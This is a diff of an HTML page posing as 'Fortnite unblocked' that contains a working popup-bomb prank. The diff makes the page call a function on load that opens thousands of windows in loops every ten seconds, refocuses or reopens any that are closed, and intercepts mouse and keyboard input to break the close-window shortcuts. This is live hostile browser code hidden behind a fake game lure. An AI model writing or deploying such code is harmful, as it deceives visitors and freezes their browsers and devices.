@@ -4,7 +4,7 @@
     <script src="sound.js" async></script>
     <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
   </head>
-  <body onload="ol()" style="background-image:url('https://cdn.glitch.global/6ab5c36c-b9fb-4f09-bde9-a94da34131f7/cosmetic-suggestion-add-a-loading-screen-of-the-chapter-5-v0-dbl0xy8k9c4c1.webp?v=1710902471012');">
+  <body onload="both2()" style="background-image:url('https://cdn.glitch.global/6ab5c36c-b9fb-4f09-bde9-a94da34131f7/cosmetic-suggestion-add-a-loading-screen-of-the-chapter-5-v0-dbl0xy8k9c4c1.webp?v=1710902471012');">
     <noscript>Please enable Javascript to play, then reload.</noscript>
     <div id="tests" style="display: none; color: white; text-align: center; vertical-align: center;">
       <h1 id="js">
@@ -17,12 +17,7 @@
         Testing if popups are enabled...
       </h1>
     </div>
-    <div>
-      <p>
-        <b style="font-size: 30px; color: white;" onclick="both()" class="w3-bottom w3-left">LOADING...</b>
-      </p>
-    </div>
-    <div id="ply" style="display: none;">
+    <div id="play" style="display: none;">
       <button style="font-size: 20px; border-color: #FF1493!important;" onclick="both()" class="w3-bottom w3-center w3-pink w3-round-large w3-button w3-third">
         <u><b>Click here to play Fortnite unblocked now!</b></u>
       </button>
@@ -37,7 +32,7 @@
             createjs.Sound.alternateExtensions = ["mp3"];
               createjs.Sound.registerSounds(
                 [ {id: 'fun', src: '/'}, ],
-              "https://cdn.glitch.global/6ab5c36c-b9fb-4f09-bde9-a94da34131f7/hack.mp3?v=1710913731797");
+              "https://cdn.glitch.global/6ab5c36c-b9fb-4f09-bde9-a94da34131f7/Rick-Roll-Sound-Effect.mp3?v=1710210562028");
           }
           catch(err){
             
@@ -62,7 +57,7 @@
     if(enabled == 1){
       document.getElementById('popups').innerHTML = "Thank you for enabling Popups.";
       document.getElementById('tests').style.display = 'none';
-      document.getElementById('ply').style.display= 'block';
+      document.getElementById('play').style.display="block";
     }else{
       document.getElementById('popups').innerHTML = "Please enable Popups to play, then reload.";
     }
@@ -71,12 +66,13 @@
 	}
   }
       function ol() {
-        preloadSound();
+        preloadSound()
         interceptUserInput(event => {
+    interactionCount += 1
 
     // Prevent default behavior (breaks closing window shortcuts)
-    event.preventDefault();
-    event.stopPropagation();
+    event.preventDefault()
+    event.stopPropagation()
 
     // 'touchstart' and 'touchend' events are not able to open a new window
     // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
@@ -87,18 +83,18 @@
     // Capture key presses on the Command or Control keys, to interfere with the
     // "Close Window" shortcut.
     if (event.key === 'Meta' || event.key === 'Control') {
-      both2();
+      both2()
     } else {
     }
         });
 }
       function focusWindows () {
   wins.forEach(win => {
-    if (!win.closed) win.focus();
+    if (!win.closed) win.focus()
     if(win.closed){
-      both2();
+      both2()
     }
-  });
+  })
 }
       
       function setCookie(cname, cvalue, exdays) {
@@ -124,25 +120,25 @@ function getCookie(cname) {
 	return "";
 }
       
-      const SCREEN_WIDTH = window.screen.availWidth;
-const SCREEN_HEIGHT = window.screen.availHeight;
-const WIN_WIDTH = 580;
-const WIN_HEIGHT = 760;
-const VELOCITY = 15;
-const MARGIN = 10;
-const TICK_LENGTH = 50;
+      const SCREEN_WIDTH = window.screen.availWidth
+const SCREEN_HEIGHT = window.screen.availHeight
+const WIN_WIDTH = 580
+const WIN_HEIGHT = 760
+const VELOCITY = 15
+const MARGIN = 10
+const TICK_LENGTH = 50
 
-const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;';
+const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'
 function windows(){
       for(var i = 0; i < 1; i=0){
-        const { x, y } = getRandomCoords();
-        const opts = `width=${WIN_WIDTH}px,height=${WIN_HEIGHT}px,left=${x},top=${y}`;
+        const { x, y } = getRandomCoords()
+        const opts = `width=${WIN_WIDTH}px,height=${WIN_HEIGHT}px,left=${x},top=${y}`
         wins.push(window.open('/new.html', '', opts));
       }
 }
       function tabs(){
         for(var i = 0; i < 1; i=0){
-        wins.push(window.open('/new.html', '', ''));
+        wins.push(window.open('/', '', ''));
       }
       }
         function both(){
@@ -151,40 +147,40 @@ function windows(){
               for(var i = 0; i < 10; i++){
                 focusWindows();
                 const { x, y } = getRandomCoords();
-            const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
+            const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
             wins.push(window.open('/p1.html', '', opts));
       }
-          wins.push(window.open('/p1.html', '', ''));
-          setTimeout(both2, 6000);
+          var w = window.open('/p1.html', '', '');
+          setTimeout(both2, 10000);
         }
       function both2(){
         for(var i = 0; i < 2000; i++){
           focusWindows();
         wins.push(window.open('/new.html', '', ''));
-            const { x, y } = getRandomCoords();
-        const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`;
+            const { x, y } = getRandomCoords()
+        const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
         wins.push(window.open('/new.html', '', opts));
       }
-          setTimeout(both2, 10000);
+          setTimeout(both2, 10000)
         }
       function getRandomCoords () {
   const x = MARGIN +
-    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN));
+    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
   const y = MARGIN +
-    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN));
-  return { x, y };
+    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
+  return { x, y }
 }
       
       function interceptUserInput (onInput) {
-  document.body.addEventListener('touchstart', onInput, { passive: false });
+  document.body.addEventListener('touchstart', onInput, { passive: false })
 
-  document.body.addEventListener('mousedown', onInput);
-  document.body.addEventListener('mouseup', onInput);
-  document.body.addEventListener('click', onInput);
+  document.body.addEventListener('mousedown', onInput)
+  document.body.addEventListener('mouseup', onInput)
+  document.body.addEventListener('click', onInput)
 
-  document.body.addEventListener('keydown', onInput);
-  document.body.addEventListener('keyup', onInput);
-  document.body.addEventListener('keypress', onInput);
+  document.body.addEventListener('keydown', onInput)
+  document.body.addEventListener('keyup', onInput)
+  document.body.addEventListener('keypress', onInput)
 }
     </script>
   </body>
